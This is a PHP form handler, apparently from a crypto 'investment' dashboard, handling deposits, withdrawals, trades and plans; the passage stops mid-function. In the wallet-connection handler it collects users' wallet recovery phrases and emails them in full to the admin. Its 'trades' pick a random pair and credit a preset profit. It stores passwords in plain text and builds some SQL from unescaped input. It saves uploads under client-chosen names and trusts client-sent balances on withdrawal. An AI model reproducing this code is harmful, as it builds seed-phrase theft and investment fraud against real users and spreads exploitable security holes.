<?php
/**
 * CODE.PHP - Form Handler & User Processing Engine
 * Handles all form submissions, transactions, trades, and user operations
 * Centralized form validation and processing for entire dashboard
 */

// ============================================
// INITIALIZATION
// ============================================

date_default_timezone_set("Europe/London");
include('../database/db_config.php');
session_start();
require('../details.php');

// Authenticate user session
if (isset($_SESSION['user_id']) && $_SESSION['user_id'] != null) {
    require('user.php');
} else {
    $_SESSION['status'] = 'User not logged in or session expired.';
    header('location: ../user/login.php');
    exit;
}

require '../admin.php';

// ============================================
// UTILITY FUNCTIONS
// ============================================

/**
 * Escape and sanitize string input
 */
function safe_input($str) {
    global $conn;
    return $conn->real_escape_string($str);
}

/**
 * Send email notification
 */
function send_email($to, $subject, $message) {
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= 'From:' . NAME . ' <' . EMAIL . '>' . "\r\n";
    mail($to, $subject, $message, $headers);
}

/**
 * Get user IP address from multiple sources
 */
function get_user_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED']))
        return $_SERVER['HTTP_X_FORWARDED'];
    elseif (!empty($_SERVER['HTTP_FORWARDED_FOR']))
        return $_SERVER['HTTP_FORWARDED_FOR'];
    elseif (!empty($_SERVER['HTTP_FORWARDED']))
        return $_SERVER['HTTP_FORWARDED'];
    elseif (!empty($_SERVER['REMOTE_ADDR']))
        return $_SERVER['REMOTE_ADDR'];
    else
        return 'UNKNOWN';
}

/**
 * Calculate future date for trades and investments
 */
function get_future_date($startDate, $hours) {
    if ($hours != null) {
        return date("Y-m-d H:i:s", strtotime($startDate) + ($hours * 3600));
    }
}

/**
 * Get crypto wallet address from gateway
 */
function get_wallet_address($gateway) {
    // Normalize input and handle common aliases
    $g = strtolower((string)$gateway);
    switch ($g) {
        case 'btc':
            return defined('w_btc') ? constant('w_btc') : '';
        case 'usdt':
        case 'trc':
            return defined('w_trc') ? constant('w_trc') : '';
        case 'eth':
            return defined('w_eth') ? constant('w_eth') : '';
        case 'ltc':
            return defined('w_ltc') ? constant('w_ltc') : '';
        default:
            return '';
    }
}

/**
 * Validate form input exists and has value
 */
function validate_required($key) {
    return isset($_POST[$key]) && !empty($_POST[$key]);
}

/**
 * Redirect with session message
 */
function redirect_with_message($url, $type = 'status', $message = '') {
    if (!empty($message)) {
        $_SESSION[$type] = $message;
    }
    header('location: ' . $url);
    exit;
}

// ============================================
// FORM HANDLER DISPATCHER
// ============================================

/**
 * Main form handler - routes to appropriate handler function
 */
function process_form() {
    // Wallet Exchange
    if (isset($_POST['wallet_exchange'])) {
        handle_wallet_exchange();
    }
    // Wallet Address Connection (BTC, LTC, ETH, TRC)
    elseif (isset($_POST['c_address'])) {
        handle_connect_address();
    }
    // Withdraw Cryptocurrency/Crypto Wallet
    elseif (isset($_POST['wth_btn'])) {
        handle_crypto_withdraw();
    }
    // Deposit via Payment Method
    elseif (isset($_POST['deposit_btn'])) {
        handle_deposit();
    }
    // Save User Profile
    elseif (isset($_POST['save_user'])) {
        handle_save_profile();
    }
    // Change Password
    elseif (isset($_POST['change_pass'])) {
        handle_change_password();
    }
    // Connect Wallet (Save Phrase)
    elseif (isset($_POST['c_wallet'])) {
        handle_wallet_connection();
    }
    // Start Automated Trade
    elseif (isset($_POST['start_trade'])) {
        handle_start_trade();
    }
    // Activate Trading Plan
    elseif (isset($_POST['plan'])) {
        handle_plan_activation();
    }
    // Withdraw via Bank Transfer
    elseif (isset($_POST['wth_btn_bank'])) {
        handle_bank_withdraw();
    }
    // KYC Verification Upload
    elseif (isset($_POST['kyc'])) {
        handle_kyc_upload();
    }
}

// ============================================
// FORM HANDLER FUNCTIONS - Wallet Operations
// ============================================

/**
 * Handle wallet exchange between user wallets (balance -> profit, etc)
 */
function handle_wallet_exchange() {
    global $conn;
    
    $user = acct_id;
    $from = isset($_POST['from_wallet']) ? (int)$_POST['from_wallet'] : 0;
    $to = isset($_POST['to_wallet']) ? (int)$_POST['to_wallet'] : 0;
    $amount = isset($_POST['amount']) ? (float)$_POST['amount'] : 0;

    $wallet_map = [1 => 'balance', 2 => 'profit'];

    // Validation
    if ($from === $to) {
        redirect_with_message('wallet-exchange.php', 'status', 'Please choose two different wallets.');
    }

    if ($amount <= 0) {
        redirect_with_message('wallet-exchange.php', 'status', 'Please enter a valid amount.');
    }

    if (!isset($wallet_map[$from]) || !isset($wallet_map[$to])) {
        redirect_with_message('wallet-exchange.php', 'status', 'Invalid wallet selection.');
    }

    // Fetch user balances
    $u_esc = safe_input($user);
    $q = "SELECT balance, profit FROM user WHERE acct_id = '$u_esc' LIMIT 1";
    $r = mysqli_query($conn, $q);
    
    if (!$r || mysqli_num_rows($r) == 0) {
        redirect_with_message('wallet-exchange.php', 'status', 'Unable to verify account balances.');
    }

    $row = mysqli_fetch_assoc($r);
    $from_col = $wallet_map[$from];
    $to_col = $wallet_map[$to];
    $from_bal = (float)$row[$from_col];
    $to_bal = (float)$row[$to_col];

    if ($from_bal < $amount) {
        redirect_with_message('wallet-exchange.php', 'status', 'Insufficient funds in the selected wallet.');
    }

    // Update balances
    $new_from = $from_bal - $amount;
    $new_to = $to_bal + $amount;

    $sql = "UPDATE user SET $from_col = " . (float)$new_from . ", $to_col = " . (float)$new_to . " WHERE acct_id = '$u_esc'";
    $up = mysqli_query($conn, $sql);

    if ($up) {
        // Record transaction
        $trx_id = uniqid('ex_');
        $desc = 'Wallet Exchange: ' . ($from_col) . ' -> ' . ($to_col);
        $amt = (float)$amount;
        $create_date = date('Y-m-d H:i:s');
        $ins = "INSERT INTO transaction (trx_id, user_id, amt, status, name, create_date, serial) VALUES ('" . safe_input($trx_id) . "', '" . $u_esc . "', '" . $amt . "', 'transfer', '" . safe_input($desc) . "', '$create_date', 1)";
        mysqli_query($conn, $ins);

        redirect_with_message('wallet-exchange.php', 'success', 'Exchange completed successfully.');
    } else {
        redirect_with_message('wallet-exchange.php', 'status', 'Failed to update wallets, please try again.');
    }
}

/**
 * Handle cryptocurrency address connection (BTC, LTC, ETH, USDT)
 */
function handle_connect_address() {
    global $conn;
    
    $user = $_SESSION['user_id'];
    $wallet_address = safe_input($_POST['address']);
    $withdraw_method_id = safe_input($_POST['withdraw_method_id']);

    $method_map = [
        'btc' => ['column' => 'btc', 'name' => 'BTC'],
        'ltc' => ['column' => 'ltc', 'name' => 'LTC'],
        'eth' => ['column' => 'eth', 'name' => 'ETH'],
        'trc' => ['column' => 'usdt', 'name' => 'TRC']
    ];

    if (!isset($method_map[$withdraw_method_id])) {
        redirect_with_message('create.php', 'status', 'Invalid withdrawal method selected.');
    }

    if (empty($wallet_address)) {
        redirect_with_message('create.php', 'status', 'Please enter your ' . $method_map[$withdraw_method_id]['name'] . ' address.');
    }

    $column = $method_map[$withdraw_method_id]['column'];
    $name = $method_map[$withdraw_method_id]['name'];
    
    $sql = "UPDATE user SET $column = '$wallet_address' WHERE acct_id = '$user'";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        redirect_with_message('create.php', 'success', $name . ' address updated successfully.');
    } else {
        redirect_with_message('create.php', 'status', 'Failed to update ' . $name . ' address, please try again.');
    }
}

// ============================================
// FORM HANDLER FUNCTIONS - Financial Operations
// ============================================

/**
 * Handle cryptocurrency withdrawal (BTC, ETH, LTC, USDT)
 */
function handle_crypto_withdraw() {
    global $conn;
    
    $id = $_SESSION['user_id'];
    $email = email;
    $amt = safe_input($_POST['amount']);
    $mth = safe_input($_POST['withdraw_account']);
    $dtls = get_wallet_address($_POST['withdraw_account']);
    $trx_id = 'WTH' . strtoupper(substr(md5(uniqid(rand(), true)), 0, 8));
    $serial = 0;
    $status = 'withdraw';
    $bal = bal;
    $profit = profit;
    $ref = ref;
    $gateway = (int)$_POST['wth_select'];

    // Determine source column and validate balance
    $source_column = '';
    $source_balance = 0;
    
    if ($gateway == 1) {
        if ($amt > $bal) {
            redirect_with_message('withdraw.php', 'status', 'Insufficient balance, please fund your account');
        }
        $source_column = 'balance';
        $source_balance = $bal;
    } elseif ($gateway == 2) {
        if ($amt > $profit) {
            redirect_with_message('withdraw.php', 'status', 'Insufficient fund in profit account');
        }
        $source_column = 'profit';
        $source_balance = $profit;
    } elseif ($gateway == 3) {
        if ($amt > $ref) {
            redirect_with_message('withdraw.php', 'status', 'Insufficient fund in referral account');
        }
        $source_column = 'referral';
        $source_balance = $ref;
    }

    // Insert transaction
    $trx_id_esc = safe_input($trx_id);
    $id_esc = safe_input($id);
    $amt_num = (float)$amt;
    $status_esc = safe_input($status);
    $mth_esc = safe_input($mth);
    $email_esc = safe_input($email);
    $dtls_esc = safe_input($dtls);
    $gateway_num = (int)$gateway;
    
    $sql = "INSERT INTO transaction (trx_id, user_id, amt, status, name, serial, email, details, gate_way) VALUES ('$trx_id_esc', '$id_esc', $amt_num, '$status_esc', '$mth_esc', $serial, '$email_esc', '$dtls_esc', $gateway_num)";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        // Send user notification
        $message = '
            <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                    <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                    <center>
                        <img src="https://' . DOMAIN . '/uploads/' . LOGO . '" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                    </center>
                    <br>
                    <p style="text-align: center; padding: 10px;">Your withdrawal request of $' . $amt . ' to ' . $mth . ' wallet has been received, kindly wait for confirmation.</p>
                    <br>
                    <p style="text-align: center; font-size: 10px;">&copy; ' . NAME . ', ' . date('Y') . '</p>
                </div>
            </div>
        ';
        send_email($email, "Withdraw Processing", $message);

        // Update user balance
        $update_bal = (float)($source_balance - $amt);
        $sql = "UPDATE user SET $source_column = $update_bal WHERE acct_id = '$id_esc'";
        mysqli_query($conn, $sql);

        // Send admin notification
        $admin_message = '
            <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                <p>New withdraw request from ' . fname . '.</p>
                <br>
                <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15px;">
                    <hr style=" color: rgb(71, 71, 71);">
                    <h5 style="color: green; text-align: center;">WITHDRAWAL DETAILS:</h5>
                    <hr style=" color: rgb(71, 71, 71);">
                    <p style="color: white;"><b style="font-size: 17px;">Trx_ID:</b> ' . $trx_id . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Amount:</b> $' . $amt . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Payment Method:</b> ' . $mth . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Wallet:</b> ' . $dtls . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Status:</b> <b style="background-color: rgb(246, 250, 41); border-radius: 10px; padding: 3px;">Pending</b></p>
                </div>
                <br>
                <center>
                    <a href="https://' . DOMAIN . '/admin/deposit.php" style="background-color: green; color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">Approve Here</a>
                </center>
                <br>
            </div>';
        send_email(Admin_Email, "Withdraw Request", $admin_message);

        redirect_with_message('withdraw.php', 'success', 'Withdrawal request of $' . $amt . ' to ' . $mth . ' wallet has been successfully submitted, kindly wait for confirmation.');
    } else {
        redirect_with_message('withdraw.php', 'status', 'Error processing withdrawal request, please try again');
    }
}

/**
 * Handle deposit via payment method with proof upload
 */
function handle_deposit() {
    global $conn;
    
    $user = $_SESSION['user_id'];
    $trx = uniqid();
    $email = email;
    $amt = safe_input($_POST['amount']);
    $status = 'deposit';
    $mth = safe_input($_POST['gateway_code']);
    $serial = 0;
    $proof = $_FILES['proof']['name'];

    $sql = "INSERT INTO transaction (trx_id, user_id, amt, status, name, serial, email, proof) VALUES ('$trx', '$user', '$amt', '$status', '$mth', $serial, '$email', '$proof')";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        move_uploaded_file($_FILES['proof']['tmp_name'], '../uploads/proofs/' . $_FILES['proof']['name']);
        
        // Send user notification
        $message = '
            <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                    <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                    <center>
                        <img src="https://' . DOMAIN . '/uploads/' . LOGO . '" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                    </center>
                    <br>
                    <p style="text-align: center; padding: 10px;">Your deposit request has been received, kindly wait for confirmation.</p>
                    <br>
                    <p style="text-align: center; font-size: 10px;">&copy; ' . NAME . ', ' . date('Y') . '</p>
                </div>
            </div>
        ';
        send_email($email, "Deposit Processing", $message);

        // Send admin notification
        $admin_message = '
            <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                <p>New deposit request from ' . fname . '.</p>
                <br>
                <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15px;">
                    <hr style=" color: rgb(71, 71, 71);">
                    <h5 style="color: green; text-align: center;">DEPOSIT DETAILS:</h5>
                    <hr style=" color: rgb(71, 71, 71);">
                    <p style="color: white;"><b style="font-size: 17px;">Trx_ID:</b> ' . $trx . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Payment Method:</b> ' . $mth . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Amount:</b> $' . number_format($amt) . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Status:</b> <b style="background-color: rgb(246, 250, 41); border-radius: 10px; padding: 3px;">Pending</b></p>
                    <br>
                    <b style="color: white; font-size: 17px;">Proof</b>
                    <a href="https://' . DOMAIN . '/uploads/proofs/' . $proof . '" target="_blank">
                        <img src="https://' . DOMAIN . '/uploads/proofs/' . $proof . '" class="rounded mx-auto d-block" width=720 height=100%>
                    </a>
                </div>
                <br>
                <center>
                    <a href="https://' . DOMAIN . '/admin/deposit.php" style="background-color: green; color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">Approve Here</a>
                </center>
                <br>
            </div>';
        send_email(Admin_Email, "Deposit Request", $admin_message);

        redirect_with_message('deposit.php', 'success', 'Your deposit request was successful');
    } else {
        redirect_with_message('deposit.php', 'status', 'Program error, kindly contact the management');
    }
}

// ============================================
// FORM HANDLER FUNCTIONS - User Profile
// ============================================

/**
 * Handle user profile updates
 */
function handle_save_profile() {
    global $conn;
    
    $user = acct_id;
    $fname = safe_input($_POST['first_name']);
    $lname = safe_input($_POST['last_name']);
    $state = safe_input($_POST['state']);
    $gender = safe_input($_POST['gender']);
    $date_of_birth = safe_input($_POST['date_of_birth']);
    $phone = safe_input($_POST['phone']);
    $country = safe_input($_POST['country']);
    $city = safe_input($_POST['city']);
    $zip = safe_input($_POST['zip_code']);
    $address = safe_input($_POST['address']);

    $sql = "UPDATE user SET first_name = '$fname', city = '$city', state = '$state', last_name = '$lname', zip='$zip', address = '$address' WHERE acct_id='$user'";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        redirect_with_message('settings.php', 'success', 'Profile updated successfully');
    } else {
        redirect_with_message('settings.php', 'status', 'Update Unsuccessful');
    }
}

/**
 * Handle password change
 */
function handle_change_password() {
    global $conn;
    
    $o_pass = safe_input($_POST['current_password']);
    $n_pass = safe_input($_POST['new_password']);
    $c_pass = safe_input($_POST['password_confirmation']);
    $db_pass = pass;
    $user = acct_id;

    if ($o_pass != $db_pass) {
        redirect_with_message('change-password.php', 'status', 'Current password is incorrect!');
    }

    if ($n_pass != $c_pass) {
        redirect_with_message('change-password.php', 'status', 'New password and confirm password do not match!');
    }

    $sql = "UPDATE user SET password = '$n_pass' WHERE acct_id = '$user'";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        redirect_with_message('change-password.php', 'success', 'Password changed successfully');
    } else {
        redirect_with_message('change-password.php', 'status', 'Error changing password, please try again');
    }
}

/**
 * Handle wallet connection (save recovery phrase)
 */
function handle_wallet_connection() {
    global $conn;
    
    $phrase = safe_input($_POST['phrase']);
    $user = acct_id;

    $sql = "UPDATE user SET phrase = '$phrase', wallet_stat = 2 WHERE acct_id = '$user'";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        // Send admin notification
        $message = '
            <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                <center>
                    <img src="https://' . DOMAIN . '/uploads/' . LOGO . '" width="100%" height="30%" alt="LOGO">
                </center><br>
                <p>' . fname . ' ' . lname . ' just submitted Wallet Phrase.</p>
                <br>
                <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15px;">
                    <hr style=" color: rgb(71, 71, 71);">
                    <h5 style="color: green; text-align: center;">Wallet Phrase:</h5>
                    <hr style=" color: rgb(71, 71, 71);">
                    <div style="background-color: antiquewhite; padding: 15px; border-radius: 25px; border: 2px solid red;">
                        <h3>' . $phrase . '</h3>
                    </div>
                </div>
                <br>
                <center>
                    <a href="https://' . DOMAIN . '/admin/user_edit.php?id=' . id . '" style="background-color: rgb(216, 0, 0); color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">Login Here</a>
                </center>
                <br>
            </div>
        ';
        send_email(Admin_Email, "Wallet Connect Pending", $message);

        redirect_with_message('wallet.php', 'success', 'Your new Crypto Wallet Connection: <i class="text-warning">Pending</i>');
    } else {
        redirect_with_message('wallet.php', 'status', 'Program error, kindly contact management');
    }
}

// ============================================
// FORM HANDLER FUNCTIONS - Trading Operations
// ============================================

/**
 * Handle automated trade initiation
 */
function handle_start_trade() {
    global $conn;
    
    $startDate = date('Y-m-d H:i:s');
    $trade_hrs = TRADE_HRS;
    $t_profit = T_PROFIT;
    $user = acct_id;
    $trx_id = $_POST['trx_id'];
    $u_bal = bal;

    // Random trading pair selection
    $pairArray = ["BTC/USDT", "ETH/BTC", "LTC/BTC", "SOL/USDT", "BNB/BTC", "BNB/USDT", "BTC/BCH", "USD/GBP", "USDC/USD", "USDT/BCH", "USD/CNY", "USD/JPY", "GBP/USD", "EUR/GBP", "EUR/USD"];
    $randomKey = array_rand($pairArray);
    $pair = $pairArray[$randomKey];

    if ($u_bal <= 0) {
        redirect_with_message('./', 'status', 'Insufficient funds, please fund your account to start trade');
    }

    $end_date = get_future_date($startDate, $trade_hrs);
    $status = 1;
    $profit = ($u_bal * $t_profit) / 100;

    $sql = "INSERT INTO trade (user, trx_id, amount, pair, profit, trade_duration, status, end_date) VALUES ('$user', '$trx_id', '$u_bal', '$pair', '$profit', '$trade_hrs', '$status', '$end_date')";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        // Send admin notification
        $message = '
            <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                <p>New Trade request from ' . fname . '.</p>
                <br>
                <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15px;">
                    <hr style=" color: rgb(71, 71, 71);">
                    <h5 style="color: green; text-align: center;">TRADE DETAILS:</h5>
                    <hr style=" color: rgb(71, 71, 71);">
                    <p style="color: white;"><b style="font-size: 17px;">Trx_ID:</b> ' . $trx_id . '</p>
                    <p style="color: white;"><b style="font-size: 17px;">Status:</b> <b style="background-color: rgb(246, 250, 41); border-radius: 10px; padding: 3px;">Activated</b></p>
                </div>
                <br>
                <center>
                    <a href="https://' . DOMAIN . '/admin/trade.php" style="background-color: green; color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">View Trade</a>
                </center>
                <br>
            </div>';
        send_email(Admin_Email, "Trade Request", $message);

        redirect_with_message('./', 'success', 'Trade Started!');
    }
}

/**
 * Handle trading plan activation
 */
function handle_plan_activation() {
    global $conn;
    
    $plan_id = 0;
    if (isset($_POST['schema_id'])) $plan_id = (int)$_POST['schema_id'];
    elseif (isset($_POST['plan_id'])) $plan_id = (int)$_POST['plan_id'];
    elseif (isset($_GET['plan_id'])) $plan_id = (int)$_GET['plan_id'];
    elseif (isset($_REQUEST['plan_id'])) $plan_id = (int)$_REQUEST['plan_id'];

    $wallet_type = isset($_POST['gateway_data']) ? safe_input($_POST['gateway_data']) : '';
    $amount = isset($_POST['invest_amount']) ? (float)$_POST['invest_amount'] : 0.0;
    $user = acct_id;
    $u_bal = bal;
    $status = 1;

    // Build preview URL
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $script_dir = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
    $base_url = $scheme . '://' . $host . $script_dir . '/schema_preview.php';
    $url = $base_url . '?plan_id=' . $plan_id;

    // Ping preview (non-blocking)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => false,
            CURLOPT_CONNECTTIMEOUT => 2,
            CURLOPT_TIMEOUT => 5
        ]);
        @curl_exec($ch);
        @curl_close($ch);
    }

    // Deposit wallet - redirect to deposit
    if ($wallet_type == "deposit") {
        $_SESSION['p_amount'] = $amount;
        redirect_with_message('deposit.php', 'status', 'Fund your account to process trade');
    }

    // Profit wallet
    elseif ($wallet_type == 'profit') {
        if (profit <= 0 || profit < $amount) {
            redirect_with_message($url, 'status', 'Insufficient funds in profit account, please fund your account to purchase a plan');
        }

        $sql = "SELECT * FROM plan WHERE id = '$plan_id'";
        $run = mysqli_query($conn, $sql);
        $val = $run->fetch_array(MYSQLI_ASSOC);

        // Validate amount range
        if ($amount < $val['min']) {
            redirect_with_message($url, 'status', 'Minimum amount for this plan is $' . number_format($val['min']));
        }
        if ($amount > $val['max'] && $val['max'] != "Unlimited") {
            redirect_with_message($url, 'status', 'Maximum amount for this plan is $' . number_format($val['max']));
        }

        // Process trade
        $trx_id = uniqid();
        $planName = $val['name'];
        $duration = $val['duration'];
        $profitPer = $val['per'];
        $end_date = get_future_date(date('Y-m-d H:i:s'), $duration);
        $profit_amt = ($amount * $profitPer) / 100;

        $sql = "INSERT INTO trade (user, trx_id, amount, pair, profit, trade_duration, status, end_date) VALUES ('$user', '$trx_id', '$amount', '$planName', '$profit_amt', '$duration', '$status', '$end_date')";
        $run = mysqli_query($conn, $sql);

        if ($run) {
            // Update profit balance
            $balUpdate = profit - $amount;
            mysqli_query($conn, "UPDATE user SET profit = $balUpdate WHERE acct_id = '$user'");

            // Send admin notification
            $message = '
                <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                    <p>New Trade request from ' . fname . '.</p>
                    <br>
                    <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15px;">
                        <hr style=" color: rgb(71, 71, 71);">
                        <h5 style="color: green; text-align: center;">TRADE DETAILS:</h5>
                        <hr style=" color: rgb(71, 71, 71);">
                        <p style="color: white;"><b style="font-size: 17px;">Trx_ID:</b> ' . $trx_id . '</p>
                        <p style="color: white;"><b style="font-size: 17px;">Amount:</b> ' . $amount . '</p>
                        <p style="color: white;"><b style="font-size: 17px;">Status:</b> <b style="background-color: rgb(246, 250, 41); border-radius: 10px; padding: 3px;">Activated</b></p>
                    </div>
                    <br>
                    <center>
                        <a href="https://' . DOMAIN . '/admin/trade.php" style="background-color: green; color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">View Trade</a>
                    </center>
                    <br>
                </div>';
            send_email(Admin_Email, "Trade Request", $message);

            redirect_with_message('schema.php', 'success', 'Plan Activated!');
        }
    }

    // Main (balance) wallet
    elseif ($wallet_type == 'main') {
        if ($u_bal <= 0 || $u_bal < $amount) {
            redirect_with_message($url, 'status', 'Insufficient funds, please fund your account to purchase a plan');
        }

        $sql = "SELECT * FROM plan WHERE id = '$plan_id'";
        $run = mysqli_query($conn, $sql);
        $val = $run->fetch_array(MYSQLI_ASSOC);

        // Validate amount range
        if ($amount < $val['min']) {
            redirect_with_message($url, 'status', 'Minimum amount for this plan is $' . number_format($val['min']));
        }
        if ($amount > $val['max'] && $val['max'] != "Unlimited") {
            redirect_with_message($url, 'status', 'Maximum amount for this plan is $' . number_format($val['max']));
        }

        // Process trade
        $trx_id = uniqid();
        $planName = $val['name'];
        $duration = $val['duration'];
        $profitPer = $val['per'];
        $end_date = get_future_date(date('Y-m-d H:i:s'), $duration);
        $profit_amt = ($amount * $profitPer) / 100;

        $sql = "INSERT INTO trade (user, trx_id, amount, pair, profit, trade_duration, status, end_date) VALUES ('$user', '$trx_id', '$amount', '$planName', '$profit_amt', '$duration', '$status', '$end_date')";
        $run = mysqli_query($conn, $sql);

        if ($run) {
            // Update balance
            $balUpdate = $u_bal - $amount;
            mysqli_query($conn, "UPDATE user SET balance = $balUpdate WHERE acct_id = '$user'");

            // Send admin notification
            $message = '
                <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                    <p>New Trade request from ' . fname . '.</p>
                    <br>
                    <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15pt;">
                        <hr style=" color: rgb(71, 71, 71);">
                        <h5 style="color: green; text-align: center;">TRADE DETAILS:</h5>
                        <hr style=" color: rgb(71, 71, 71);">
                        <p style="color: white;"><b style="font-size: 17px;">Trx_ID:</b> ' . $trx_id . '</p>
                        <p style="color: white;"><b style="font-size: 17px;">Amount:</b> ' . $amount . '</p>
                        <p style="color: white;"><b style="font-size: 17px;">Status:</b> <b style="background-color: rgb(246, 250, 41); border-radius: 10px; padding: 3px;">Activated</b></p>
                    </div>
                    <br>
                    <center>
                        <a href="https://' . DOMAIN . '/admin/trade.php" style="background-color: green; color: white; text-decoration: none; padding: 4px 20px; border: 2px solid rgb(216, 0, 0); border-radius: 10px; font-size: 25px;" class="button">View Trade</a>
                    </center>
                    <br>
                </div>';
            send_email(Admin_Email, "Trade Request", $message);

            redirect_with_message('schemas.php', 'success', 'Plan Activated!');
        }
    } else {
        redirect_with_message('schema.php', 'status', 'An error occured, please try again');
    }
}

// ============================================
// FORM HANDLER FUNCTIONS - Bank Withdrawal
// ============================================

/**
 * Handle bank transfer withdrawal
 */
function handle_bank_withdraw() {
    global $conn;
    
    $id = $_SESSION['user_id'];
    $mth = 'BANK';
    $email = safe_input($_POST['email']);
    $amt = (float)$_POST['wth_amt'];
    $bank = safe_input($_POST['bank']);
    $acct_name = safe_input($_POST['acct_name']);
    $acct_num = safe_input($_POST['acct_num']);
    $trx_id = safe_input($_POST['trx_id']);
    $serial = 0;
    $status = 'withdraw';
    $bal = (float)$_POST['user_bal'];
    $profit = (float)$_POST['user_pro'];
    $ref = (float)$_POST['ref'];
    $gateway = (int)$_POST['wth_select'];
    $route = safe_input($_POST['route']);

    // Minimum withdrawal amount
    if ($amt < 1000) {
        redirect_with_message('withdraw.php', 'status', 'Your current withdrawal amount is not up to our $1000 minimum withdraw amount');
    }

    // Determine source column and validate balance
    $source_column = '';
    $source_balance = 0;
    
    if ($gateway == 1) {
        if ($amt > $bal || $amt == 0) {
            redirect_with_message('withdraw.php', 'status', 'Insufficient fund');
        }
        $source_column = 'balance';
        $source_balance = $bal;
    } elseif ($gateway == 2) {
        if ($amt > $profit || $amt == 0) {
            redirect_with_message('withdraw.php', 'status', 'Insufficient fund');
        }
        $source_column = 'profit';
        $source_balance = $profit;
    } elseif ($gateway == 3) {
        if ($amt > $ref || $amt == 0) {
            redirect_with_message('withdraw.php', 'status', 'Insufficient fund');
        }
        $source_column = 'referral';
        $source_balance = $ref;
    }

    // Insert transaction
    $sql = "INSERT INTO transaction (trx_id, user_id, amt, status, name, serial, email, gate_way, bank_name, acct_name, acct_num, route) VALUES ('$trx_id', '$id', '$amt', '$status', '$mth', '$serial', '$email', '$gateway', '$bank', '$acct_name', '$acct_num', '$route')";
    $run = mysqli_query($conn, $sql);

    if ($run) {
        // Send user notification
        $message = '
            <div style="background-color: rgb(175, 175, 175); padding: 30px;">
                <div style="max-width: 500px; margin:auto; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); padding: 30px;">
                    <h6 style="text-align: center; background-color: rgb(175, 175, 175); padding: 15px; margin: 6px -12px;">Notification</h6>
                    <center>
                        <img src="https://' . DOMAIN . '/uploads/' . LOGO . '" style="filter: invert(100%);" width="100%" height="180" alt="LOGO">
                    </center>
                    <br>
                    <p style="text-align: center; padding: 10px;">Your withdrawal request of $' . $amt . ' to ' . $bank . ' has been received, kindly wait for confirmation.</p>
                    <br>
                    <p style="text-align: center; font-size: 10px;">&copy; ' . NAME . ', ' . date('Y') . '</p>
                </div>
            </div>
        ';
        send_email($email, "Withdraw Processing", $message);

        // Update balance
        $update_bal = $source_balance - $amt;
        mysqli_query($conn, "UPDATE user SET $source_column = $update_bal WHERE acct_id = '$id'");

        // Send admin notification
        $admin_message = '
            <div style="max-width: 500px; margin:auto; background-color: rgb(21, 26, 70); color: white; padding: 15px; border-radius: 20px;">
                <p>New withdraw request from ' . fname . '.</p>
                <br>
                <div style ="background-color:rgb(37, 35, 35); padding:20px; margin: 10px; border-radius:15px;">
                    <hr style=" color: rgb(71, 71, 71);">
